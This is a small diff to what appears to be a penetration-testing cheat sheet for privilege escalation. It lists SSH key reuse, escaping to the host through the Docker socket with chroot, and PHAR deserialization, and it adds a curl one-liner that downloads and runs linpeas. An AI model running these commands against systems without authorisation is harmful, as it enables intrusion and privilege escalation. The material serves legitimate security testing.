@@ -7,6 +7,9 @@ SSH private key found → ssh -i id_rsa user@other-host.
 Docker socket writable → run docker run -v /:/host --rm -it alpine chroot /host sh.
 PHAR / upload deserialization → upload crafted .phar and trigger file_exists("phar://...") or include.
 
+Linux: linpeas.sh, LinEnum.sh, pspy, lse.sh
+curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+
 Quick 10-minute checklist RUN FIRST
 
 # identity & environment
